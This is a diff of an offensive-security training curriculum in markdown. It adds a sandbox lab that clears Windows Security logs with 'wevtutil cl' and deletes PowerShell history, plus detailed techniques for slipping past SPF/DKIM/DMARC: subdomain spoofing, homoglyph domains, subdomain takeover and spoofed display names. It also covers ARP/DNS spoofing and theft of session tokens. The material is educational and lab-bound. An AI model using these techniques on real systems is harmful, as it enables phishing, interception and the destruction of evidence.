 - [ ] **ROE Compliance:** In a red team engagement, anti-forensics and log cleanup are controlled by Rules of Engagement — know exactly what your RoE permits before touching any log or artifact, and never destroy data on production systems regardless of privilege level.
+
+> **🔬 Observation Lab (Stage 5):** In a Windows sandbox VM: (1) Run `wevtutil cl Security` to clear the Security event log. Open Event Viewer and confirm the log is empty. Now check the same Security log — observe Event ID 1102 ("The audit log was cleared"). (2) Open PowerShell history file (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`) and note what is logged. Delete one entry manually — run `Get-History` in a new session and compare. Document: which artifacts survived the clearance attempt and what a defender reviewing logs 5 minutes after the clear would still find.
 
 ---
 
@@ -1416,6 +1639,10 @@
 > [!IMPORTANT]
 > **Move-On Gate (Part 8):** You can explain the malware taxonomy and choose the correct category for a given attack objective; generate payloads using `msfvenom` and a C2 framework; understand conceptually how Stages 2–5 techniques work and what defenders detect; deliver a weaponized document in a lab environment; and map a simulated campaign to MITRE ATT&CK. You are not expected to implement custom implants, PE packers, or EDR bypass code at this stage — that comes after Part 28 and in Part 42.
 
+---
+
+---
+
 <a id="toc-part-9-sniffing--spoofing"></a>
 <a id="part-9-sniffing-spoofing"></a>
 
@@ -1464,7 +1691,7 @@
 > [!TIP]
 > **Goal:** Inject false information into the network to redirect or manipulate traffic.
 
-- [ ] **ARP Spoofing:** Flood the network with **gratuitous ARP packets** linking your MAC to the **gateway IP**; forces the switch to route victim traffic through you; use **arpspoof, dsniff, bettercap**.
+- [ ] **ARP Spoofing:** Flood the network with **gratuitous ARP packets** linking your MAC to the **gateway IP**; forces the switch to route victim traffic through you; use **arpspoof, dsniff, b[ettercap](../Tools/Ettercap.md)**.
 
 - [ ] **DNS Spoofing:** Respond to **DNS queries faster than the legitimate server**; redirect victims to malicious login pages for **credential harvesting** or **malware distribution**.
 
@@ -1485,7 +1712,7 @@
 > [!TIP]
 > **Goal:** Intercept, modify, and relay traffic to extract or manipulate data.
 
-- [ ] **MITM Positioning:** Establish yourself between victim and gateway via **ARP spoofing, DNS redirection, rogue DHCP, or rogue AP**; use **ettercap, mitmproxy, Burp Suite** to intercept and modify traffic in real-time.
+- [ ] **MITM Positioning:** Establish yourself between victim and gateway via **ARP spoofing, DNS redirection, rogue DHCP, or rogue AP**; use **ettercap, mitmproxy, [Burp Suite](../Tools/Burp_Suite.md)** to intercept and modify traffic in real-time.
 
 - [ ] **Session Hijacking:** Extract **session cookies, JWT tokens, CSRF tokens** from sniffed **HTTP headers** and **POST bodies**; inject stolen tokens to impersonate user without password.
 
@@ -1520,7 +1747,7 @@
 | Level | Task                                                           | Deliverable                               |
 | ----- | -------------------------------------------------------------- | ----------------------------------------- |
 | 1     | Capture traffic with Wireshark in a home lab (HTTP, FTP, DNS)  | Annotated pcap with credential extraction |
-| 2     | Perform ARP spoofing + MITM with Bettercap in lab              | Screenshot of intercepted traffic         |
+| 2     | Perform ARP spoofing + MITM with [Bettercap](../Tools/Bettercap.md) in lab              | Screenshot of intercepted traffic         |
 | 3     | Execute DNS spoofing to redirect lab traffic to phishing page  | DNS spoof lab report                      |
 | 4     | Perform SSL stripping against a lab web server without HSTS    | Before/after traffic comparison           |
 | 5     | Full MITM chain: ARP spoof → DNS redirect → credential capture | End-to-end MITM lab report                |
@@ -1530,6 +1757,10 @@
 
 ---
 
+
+---
+
+---
 
 <a id="toc-part-10-social-engineering"></a>
 
@@ -1649,7 +1880,16 @@ Robert Cialdini's research on influence identified six universal principles that
 
 - [ ] **Deepfake Vishing:** Use **voice cloning/video deepfakes** (e.g., ElevenLabs) for **executive impersonation** in calls/meetings.
 
-- [ ] **ClickFix/ClearFake:** Simulate browser/OS errors that instruct users to **copy-paste provided PowerShell/terminal scripts** (“fix/update now”).
+- [ ] **ClickFix/ClearFake:** Simulate browser/OS errors that instruct users to **copy-paste provided PowerShell/terminal scripts** ("fix/update now").
+
+- [ ] **Email Authentication Bypass (DMARC/DKIM/SPF Offensive):** Understand how to send convincing email as or near a target domain, bypassing authentication controls:
+  - **DMARC alignment bypass:** DMARC passes when the From header domain *aligns* with either the SPF envelope-from or the DKIM signing domain. A target with `p=quarantine` but no subdomain policy (`sp=none`) allows subdomain spoofing — register `mail.target.com` and send from a subdomain not covered by the DMARC policy.
+  - **Missing DMARC / weak p=none:** Check with `dig TXT _dmarc.target.com` — if the record is absent or `p=none`, the domain can be directly spoofed without filtering. Use [dmarc.postmarkapp.com](https://dmarc.postmarkapp.com) or `checkdmarc` to scan targets during recon.
+  - **Homoglyph domains:** Register visually identical domains using Unicode lookalike characters (e.g., `Ⅰ` for `l`, `а` for `a`). IDN homoglyph attack: `xn--paypl-h2a.com` renders as `payрal.com` in some email clients. Tools: `dnstwist` with `--registered` flag.
+  - **Subdomain takeover for mail spoofing:** If a dangling CNAME on a target subdomain points to an unclaimed third-party service (SendGrid, Mailchimp, GitHub Pages), claim the service and send email from that subdomain. It passes SPF and DKIM because it is a legitimate sending service now controlled by you.
+  - **Spoofed display names:** Many mail clients show only the display name, not the From address. `"CEO Name <attacker@random.com>"` passes all authentication controls and appears as CEO to a mobile viewer. Combine with similar-looking reply-to addresses.
+  - **SPF softfail exploitation:** A `~all` SPF record (softfail) means DMARC still evaluates — but many recipients accept softfail-flagged mail if DMARC is absent or `p=none`.
+  - **Defensive counter-reference:** See Phase 3 Part 14 Stage 6 for the defender-side SPF/DKIM/DMARC configuration and detection.
 
 ---
 
@@ -1711,10 +1951,14 @@ Robert Cialdini's research on influence identified six universal principles that
 
 - [ ] **Email Authentication Lab:** Configure and validate SPF, DKIM, and DMARC on a test domain or lab mail stack.
 - [ ] **Header Forensics Lab:** Analyze benign/phishing email headers and identify sender path, SPF/DKIM/DMARC result, and suspicious infrastructure.
-- [ ] **GoPhish Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
+- [ ] **[GoPhish](../Tools/GoPhish.md) Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
 - [ ] **Pretext Review:** Write three pretexts and then write the defensive awareness guidance that would defeat them.
   > [!IMPORTANT]
   > **Move-On Gate:** Produce a social-engineering simulation plan with ROE, consent model, metrics, and debrief template.
+
+---
+
+---
 
 <a id="toc-part-11-denial-of-service"></a>
 <a id="part-11-denial-of-service"></a>
@@ -1797,12 +2041,14 @@ Robert Cialdini's research on influence identified six universal principles that
 | ----- | ------------------------------------------------------------- | ---------------------------------------- |
 | 1     | Study DoS attack types and classify by OSI layer              | Classification document with examples    |
 | 2     | Simulate SYN flood against lab web server with hping3         | Traffic capture + server impact analysis |
-| 3     | Test Slowloris against Apache in lab, then apply mitigation   | Before/after performance comparison      |
+| 3     | Test [Slowloris](../Tools/Slowloris.md) against Apache in lab, then apply mitigation   | Before/after performance comparison      |
 | 4     | Configure rate limiting and SYN cookies on lab firewall       | Firewall configuration + test results    |
 | 5     | Design a DDoS defense architecture for a hypothetical company | Architecture diagram + defense plan      |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can explain and classify DoS/DDoS attack types, demonstrate basic DoS in a lab, and design defensive countermeasures at the network, host, and application layers.
+
+---
 
 ---
 
